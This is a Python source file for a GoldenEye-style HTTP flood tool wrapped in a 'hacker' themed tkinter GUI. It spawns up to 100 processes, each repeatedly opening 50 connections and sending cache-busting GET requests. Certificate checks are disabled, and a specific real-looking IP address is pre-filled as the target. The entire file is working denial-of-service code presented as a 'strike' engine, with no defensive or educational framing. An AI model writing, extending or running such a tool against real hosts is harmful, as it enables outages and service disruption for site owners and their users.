#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from multiprocessing import Process, Manager, Queue
import urllib.parse, ssl, sys, random, time, os, threading
import http.client

# --- Core Logic ---

class Striker(Process):
    """Handles HTTP requests in a separate process with colored status reporting."""
    def __init__(self, url, nr_sockets, counter, log_queue):
        super(Striker, self).__init__()
        self.counter = counter
        self.nr_socks = nr_sockets
        self.log_queue = log_queue
        
        parsedUrl = urllib.parse.urlparse(url)
        self.ssl = parsedUrl.scheme == 'https'
        self.host = parsedUrl.netloc.split(':')[0]
        self.url = parsedUrl.path or '/'
        self.port = parsedUrl.port or (443 if self.ssl else 80)
        self.runnable = True

    def run(self):
        while self.runnable:
            socks = []
            try:
                # 1. Loading Phase
                self.report("LOAD", f"Initializing {self.nr_socks} sockets...")
                
                for _ in range(self.nr_socks):
                    if not self.runnable: break
                    try:
                        if self.ssl:
                            ctx = ssl._create_unverified_context()
                            c = http.client.HTTPSConnection(self.host, self.port, context=ctx, timeout=5)
                        else:
                            c = http.client.HTTPConnection(self.host, self.port, timeout=5)
                        socks.append(c)
                    except Exception as e:
                        self.report("FAIL", f"Connection Rejected: {str(e)}")

                # 2. Strike Phase
                for conn in socks:
                    if not self.runnable: break
                    try:
                        request_url = f"{self.url}?{random.randint(1, 999)}={random.randint(1, 999)}"
                        headers = {"User-Agent": "GoldenEye/v2.1", "Cache-Control": "no-cache"}
                        conn.request("GET", request_url, None, headers)
                    except Exception as e:
                        self.report("WARN", f"Socket hangup: {str(e)}")

                # 3. Response Phase
                for conn in socks:
                    if not self.runnable: break
                    try:
                        res = conn.getresponse()
                        if res.status < 400:
                            self.counter[0] += 1
                            self.report("HIT", f"Strike successful - HTTP {res.status}")
                        else:
                            self.report("FAIL", f"Server blocked - HTTP {res.status}")
                    except Exception:
                        self.report("FAIL", "Remote host closed connection")

                for conn in socks: conn.close()
                
            except Exception as e:
                self.report("FAIL", f"Process Error: {str(e)}")
                time.sleep(1)

    def report(self, level, msg):
        """Sends categorized data back to the GUI."""
        if level == "FAIL":
            self.counter[1] += 1
        self.log_queue.put((level, msg))

# --- Hacker GUI Theme ---

class GorgeousHackerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("GOLDENEYE ELITE TERMINAL")
        self.root.geometry("900x750")
        self.root.configure(bg="#050505")
        
        self.active = False
        self.workers = []
        self.log_queue = Queue()

        self.setup_ui()
        
        # Polling thread for logs
        threading.Thread(target=self.poll_logs, daemon=True).start()

    def setup_ui(self):
        # Header Banner
        banner = ">> GOLDENEYE STRESS ENGINE ACTIVE <<"
        tk.Label(self.root, text=banner, font=("Fixedsys", 20), bg="#050505", fg="#00FF00").pack(pady=15)

        # Control Panel
        ctrl = tk.Frame(self.root, bg="#111", borderwidth=1, relief="flat")
        ctrl.pack(fill="x", padx=30, pady=10)

        tk.Label(ctrl, text="TARGET_IP:", bg="#111", fg="#00FF00", font=("Courier", 10)).grid(row=0, column=0, padx=10, pady=10)
        self.url_entry = tk.Entry(ctrl, width=40, bg="#000", fg="#00FF00", borderwidth=0, insertbackground="#00FF00")
        self.url_entry.insert(0, "http://161.248.188.190")
        self.url_entry.grid(row=0, column=1)

        tk.Label(ctrl, text="PROCESSES:", bg="#111", fg="#00FF00", font=("Courier", 10)).grid(row=0, column=2, padx=10)
        self.w_spin = tk.Spinbox(ctrl, from_=1, to=100, width=5, bg="#000", fg="#00FF00")
        self.w_spin.grid(row=0, column=3)

        # Stats Area
        stats = tk.Frame(self.root, bg="#050505")
        stats.pack(pady=5)
        self.hits_lbl = tk.Label(stats, text="STRIKES: 0", font=("Courier", 14, "bold"), bg="#050505", fg="#00FF00")
        self.hits_lbl.pack(side="left", padx=40)
        self.fails_lbl = tk.Label(stats, text="DROPPED: 0", font=("Courier", 14, "bold"), bg="#050505", fg="#FF0000")
        self.fails_lbl.pack(side="left", padx=40)

        # Log Console
        self.console = scrolledtext.ScrolledText(self.root, height=22, bg="#000", fg="#00FF00", font=("Courier", 9), borderwidth=0)
        self.console.pack(fill="both", expand=True, padx=30, pady=10)

        # Define Colors for Tags
        self.console.tag_config("HIT", foreground="#00FF00")   # Green
        self.console.tag_config("FAIL", foreground="#FF0000")  # Red
        self.console.tag_config("WARN", foreground="#FFFF00")  # Yellow
        self.console.tag_config("LOAD", foreground="#BF00FF")  # Purple
        self.console.tag_config("SYS", foreground="#00FFFF")   # Cyan

        # Execute Button
        self.btn = tk.Button(self.root, text="[ INITIALIZE STRIKE ]", font=("Courier", 12, "bold"), 
                             bg="#000", fg="#00FF00", activebackground="#00FF00", activeforeground="#000",
                             command=self.toggle)
        self.btn.pack(pady=20)

    def poll_logs(self):
        while True:
            try:
                level, msg = self.log_queue.get(timeout=0.1)
                timestamp = time.strftime('%H:%M:%S')
                line_start = f"[{timestamp}] "
                
                # Insert timestamp with default color
                self.console.insert(tk.END, line_start)
                # Insert the status and message with the specific color tag
                self.console.insert(tk.END, f"{level}: {msg}\n", level)
                
                self.console.see(tk.END)
                if int(self.console.index('end-1c').split('.')[0]) > 800:
                    self.console.delete('1.0', '2.0')
            except:
                continue

    def toggle(self):
        if not self.active:
            url = self.url_entry.get()
            if not url.startswith("http"):
                messagebox.showerror("ERROR", "INVALID PROTOCOL")
                return

            self.manager = Manager()
            self.counter = self.manager.list([0, 0])
            self.active = True
            self.btn.config(text="[ TERMINATE SESSION ]", fg="#FF0000")
            self.log_queue.put(("SYS", "ENGINE STARTING..."))
            
            for _ in range(int(self.w_spin.get())):
                p = Striker(url, 50, self.counter, self.log_queue) # Fixed 50 sockets per worker for stability
                p.daemon = True
                p.start()
                self.workers.append(p)
            self.update_stats()
        else:
            self.shutdown()

    def update_stats(self):
        if self.active:
            self.hits_lbl.config(text=f"STRIKES: {self.counter[0]}")
            self.fails_lbl.config(text=f"DROPPED: {self.counter[1]}")
            self.root.after(500, self.update_stats)

    def shutdown(self):
        self.active = False
        for p in self.workers: p.terminate()
        self.workers = []
        self.btn.config(text="[ INITIALIZE STRIKE ]", fg="#00FF00")
        self.log_queue.put(("SYS", "SESSION TERMINATED BY OPERATOR"))

if __name__ == "__main__":
    root = tk.Tk()
    app = GorgeousHackerGUI(root)
    root.mainloop()
